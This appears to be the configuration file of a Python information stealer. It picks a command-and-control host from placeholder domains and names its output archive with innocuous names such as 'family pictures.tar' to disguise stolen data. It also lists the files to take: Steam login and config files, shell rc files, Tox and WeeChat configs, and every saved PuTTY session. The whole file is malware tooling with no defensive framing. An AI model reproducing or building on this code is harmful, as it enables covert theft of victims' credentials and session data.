import os
from random import choice

appdata = os.getenv('APPDATA')

class cfg:
    cnc = choice([
        'cnc.foo.bar',
        'cnc.bar.foo'
    ])

    datafile = choice(['family pictures','vacation photos','dog pictures'])+'.tar'

    filesources = [
        # folder, filenames (* as wildcard)
        ('C:\\Program Files (x86)\\Steam', ['config.vdf','libraryfolders.vdf','loginusers.vdf']),
        (os.path.expanduser('~'), ['.bashrc','.zshrc','.fishrc','.bash_aliases']),
        (os.path.join(os.path.expanduser('~'), '.config', 'tox'), ['.tox']),
        (os.path.join(os.path.expanduser('~'), '.config', 'weechat'), ['.conf']),
        (os.path.join(os.path.expanduser('~'), '.putty', 'sessions'), '*')
    ]